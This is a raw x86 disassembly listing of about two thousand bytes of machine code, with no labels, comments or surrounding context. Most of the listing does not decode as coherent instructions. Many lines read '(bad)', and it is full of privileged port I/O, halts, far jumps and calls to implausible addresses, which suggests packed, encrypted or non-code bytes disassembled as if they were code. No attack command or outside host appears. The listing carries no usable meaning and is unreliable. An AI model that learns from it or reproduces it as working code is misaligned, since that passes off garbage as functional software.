  41773e:	pop    edx
  41773f:	(bad)  
  417740:	out    0x15,al
  417742:	dec    ebx
  417743:	sbb    DWORD PTR [ebp-0x303cd69],0x31
  41774a:	cmp    al,0x2e
  41774c:	sub    eax,0x70c6b10d
  417751:	imul   esp,DWORD PTR [ecx],0x60fadba6
  417757:	pushw  cs
  417759:	out    dx,al
  41775a:	imul   edi,DWORD PTR ds:0xf67e196c,0x3a
  417761:	int3   
  417762:	inc    esi
  417763:	jnp    0x417797
  417765:	mov    bl,0x7e
  417767:	pop    es
  417768:	cmp    DWORD PTR [esi-0x3695f731],esp
  41776e:	int    0x51
  417770:	cld    
  417771:	mov    ds:0xe08a6be,eax
  417776:	cmp    BYTE PTR [ebx],bh
  417778:	ret    0xf111
  41777b:	ins    DWORD PTR es:[edi],dx
  41777c:	js     0x417772
  41777e:	out    0x42,eax
  417780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417781:	cmc    
  417782:	(bad)  
  417783:	sub    al,BYTE PTR [eax-0x7925bf95]
  417789:	lock mov ebp,0x1a849bad
  41778f:	fld    DWORD PTR [ecx]
  417791:	mov    al,ds:0x8c885a37
  417796:	fst    QWORD PTR [edi+ebp*8-0x1102d0a8]
  41779d:	push   0x24074c85
  4177a2:	pop    eax
  4177a3:	dec    ebx
  4177a4:	and    al,0x30
  4177a6:	inc    ebx
  4177a7:	fmul   DWORD PTR [edx]
  4177a9:	es fcomip st,st(2)
  4177ac:	pop    esp
  4177ad:	sbb    BYTE PTR [ecx],dl
  4177af:	and    DWORD PTR [edx],ebp
  4177b1:	xchg   edi,eax
  4177b2:	fwait
  4177b3:	mov    eax,ds:0x54283941
  4177b8:	loopne 0x4177ad
  4177ba:	and    BYTE PTR [ebp+0x78],al
  4177bd:	mov    ds:0x5e39d9de,al
  4177c2:	sbb    eax,0x323400b0
  4177c7:	sbb    dh,BYTE PTR [ebx-0x4ec50a6f]
  4177cd:	(bad)  
  4177ce:	out    0x68,eax
  4177d0:	js     0x4177f0
  4177d2:	mov    fs,WORD PTR [edi]
  4177d4:	dec    ecx
  4177d5:	loope  0x417784
  4177d7:	inc    esi
  4177d8:	and    BYTE PTR [ebx+0x394b9858],dl
  4177de:	mov    edx,0x912cbc1b
  4177e3:	push   ss
  4177e4:	xchg   ecx,eax
  4177e5:	fild   DWORD PTR [ebx+0x70]
  4177e8:	leave  
  4177e9:	sub    BYTE PTR [ebx-0x7608d4cc],cl
  4177ef:	push   cs
  4177f0:	(bad)  
  4177f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177f2:	push   0xb8cc0574
  4177f7:	pop    edi
  4177f8:	ss inc edx
  4177fa:	mov    edx,0x99962e22
  4177ff:	xchg   ah,dl
  417801:	cmc    
  417802:	xchg   al,cl
  417804:	push   0x43
  417806:	icebp  
  417807:	mov    ds:0x31949a97,al
  41780c:	scas   eax,DWORD PTR es:[edi]
  41780d:	in     eax,0x2f
  41780f:	inc    ebx
  417810:	loop   0x417864
  417812:	test   DWORD PTR [ebp-0x36a4a157],edx
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
